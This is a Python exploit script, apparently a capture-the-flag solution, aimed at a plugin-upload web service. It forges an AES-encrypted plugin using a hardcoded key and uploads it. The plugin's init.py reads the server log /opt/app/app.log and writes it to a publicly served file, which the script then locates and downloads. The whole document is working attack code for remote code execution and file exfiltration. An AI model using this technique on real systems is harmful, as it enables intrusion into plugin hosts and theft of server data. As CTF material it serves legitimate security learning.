import io, zipfile, json, time, re
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

BASE = "http://ctf.ac.upt.ro:9942"
KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

r = requests.get(f"{BASE}/store/download/flag.plugin", timeout=15)
if r.status_code != 200:
    print("Failed to download flag.plugin. Status:", r.status_code)
    print("Response:", r.text[:400])
    raise SystemExit(1)
with open("flag_downloaded.plugin", "wb") as f:
    f.write(r.content)
print("Saved flag_downloaded.plugin ({} bytes)".format(len(r.content)))

files = {'file': ('flag.plugin', open("flag_downloaded.plugin", "rb"), "application/octet-stream")}
r = requests.post(f"{BASE}/upload", files=files, allow_redirects=True, timeout=30)
print("Upload response:", r.status_code)
time.sleep(1.0)

init_py = r'''
import pathlib, os
p = pathlib.Path(__file__).resolve().parent
out = p / "leak.txt"
try:
    with open("/opt/app/app.log", "r", errors="ignore") as f:
        data = f.read()
    out.write_text(data)
except Exception as e:
    out.write_text("ERR: " + str(e))
print("leak written")
'''
manifest = {"name":"leaker-auto","version":"0.1","author":"you","icon":"thumbnail.svg"}

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
    z.writestr("plugin_manifest.json", json.dumps(manifest))
    z.writestr("init.py", init_py)
    z.writestr("thumbnail.svg", "<svg xmlns='http://www.w3.org/2000/svg' width='64' height='64'></svg>")
plain = buf.getvalue()

iv = get_random_bytes(16)
cipher = AES.new(KEY, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(plain, AES.block_size))
with open("leaker.plugin","wb") as f:
    f.write(iv + ct)

files = {'file': ('leaker.plugin', open("leaker.plugin","rb"), "application/octet-stream")}
r = requests.post(f"{BASE}/upload", files=files, allow_redirects=True, timeout=30)
print("Upload response:", r.status_code)
time.sleep(1.2)

dash = requests.get(f"{BASE}/").text
m = re.search(r'href="/widget/([0-9a-fA-F-]+)">\s*leaker-auto', dash)
if not m:
    uids = re.findall(r'href="/widget/([0-9a-fA-F-]+)"', dash)
    leaker_uid = None
    for uid in uids:
        try:
            page = requests.get(f"{BASE}/widget/{uid}", timeout=6).text
            if "leaker-auto" in page or "leak.txt" in page:
                leaker_uid = uid
                break
        except Exception:
            pass
    if not leaker_uid:
        print(dash[:2000])
        raise SystemExit(1)
else:
    leaker_uid = m.group(1)
print("Found leaker uid:", leaker_uid)

leak_url = f"{BASE}/widget/{leaker_uid}/leak.txt"
print("Attempting to fetch leak:", leak_url)
r = requests.get(leak_url, timeout=15)
if r.status_code == 200:
    print("LEAKED app.log")
    print(r.text)
    print("END LEAK")
else:
    print("Failed to fetch leak.txt (status {})".format(r.status_code))
    print("Widget page snippet:")
    print(requests.get(f"{BASE}/widget/{leaker_uid}").text[:1000])
